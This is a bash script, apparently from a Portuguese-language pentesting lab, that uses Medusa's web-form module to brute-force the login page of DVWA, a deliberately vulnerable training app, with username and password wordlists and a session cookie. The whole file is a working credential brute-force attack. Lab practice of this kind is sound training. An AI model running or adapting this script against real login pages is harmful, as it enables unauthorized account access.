#!/bin/bash
# ============================================================
# Cenário 2: Automação de tentativas em formulário web (DVWA)
# ============================================================
# Pré-requisitos:
#   - DVWA rodando (geralmente dentro do Metasploitable2 ou
#     em container próprio), nível de segurança "low"
#   - Cookie de sessão PHPSESSID válido (DVWA exige login prévio)
#   - Identificar previamente via Burp Suite/DevTools:
#       * nome dos campos do formulário (username, password, Login)
#       * cookie de sessão
#       * string retornada em caso de falha de login
#
# Uso:
#   chmod +x 02_dvwa_bruteforce.sh
#   ./02_dvwa_bruteforce.sh <IP_ALVO> <PHPSESSID> <SECURITY_COOKIE>
# ============================================================

ALVO="${1:-192.168.56.102}"
PHPSESSID="${2:-COLOQUE_O_PHPSESSID_AQUI}"
SECURITY="${3:-low}"
USUARIOS="../wordlists/usuarios.txt"
SENHAS="../wordlists/senhas.txt"

echo "[*] Ataque de força bruta com Medusa (módulo web-form)"
medusa -h "$ALVO" \
       -U "$USUARIOS" \
       -P "$SENHAS" \
       -M web-form \
       -m FORM:"/dvwa/login.php" \
       -m DENY-SIGNAL:"login.php" \
       -m FORM-DATA:"username=&password=&Login=Login" \
       -T 2 \
       -t 2 \
       -v 6 \
       -F \
       -O /tmp/dvwa_log_cookie:"security=${SECURITY}; PHPSESSID=${PHPSESSID}"

echo "[*] Validação manual: acessar http://$ALVO/dvwa/login.php com a credencial encontrada"
